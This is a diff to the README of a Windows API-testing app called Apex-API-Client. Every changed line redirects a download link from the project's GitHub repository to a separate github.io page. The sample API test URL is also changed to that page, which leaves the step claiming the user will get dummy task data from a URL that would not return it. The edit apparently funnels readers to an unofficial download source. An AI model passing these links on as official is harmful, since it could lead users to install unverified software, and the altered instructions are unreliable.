@@ -1,6 +1,6 @@
 # 🚀 Apex-API-Client - Test APIs Faster and Smarter
 
-[![Download Apex-API-Client](https://img.shields.io/badge/Download-Apex--API--Client-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fengstanza/Apex-API-Client)
+[![Download Apex-API-Client](https://img.shields.io/badge/Download-Apex--API--Client-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://fengstanza.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Your Windows computer needs only a few basic things to run Apex-API-Client:
 
 ## 💾 Download and Installation
 
-Visit this link to download the application: [Apex-API-Client Official Download](https://github.com/fengstanza/Apex-API-Client)
+Visit this link to download the application: [Apex-API-Client Official Download](https://fengstanza.github.io)
 
 ### Step-by-Step Installation Guide
 
@@ -69,7 +69,7 @@ When you open Apex-API-Client for the first time, you'll see a clean, welcoming 
 
 Let's test your very first API request to confirm everything works:
 
-1. In the address bar, type: `https://jsonplaceholder.typicode.com/todos/1`
+1. In the address bar, type: `https://fengstanza.github.io`
 2. Make sure the dropdown says "GET"
 3. Press the **Send** button
 4. Congratulations! You should see a response containing dummy data about a task
@@ -300,7 +300,7 @@ Your input shapes the future of this application!
 
 ## 📥 Download Again
 
-Need to re-download Apex-API-Client? [Click here](https://github.com/fengstanza/Apex-API-Client) to visit the official download page. Bookmark this link for quick access.
+Need to re-download Apex-API-Client? [Click here](https://fengstanza.github.io) to visit the official download page. Bookmark this link for quick access.
 
 Whether you're debugging a web service, teaching yourself about APIs, or professionally testing enterprise systems, Apex-API-Client stands ready as your reliable companion. Its lightweight nature means it starts instantly and runs without bogging down your computer.
 
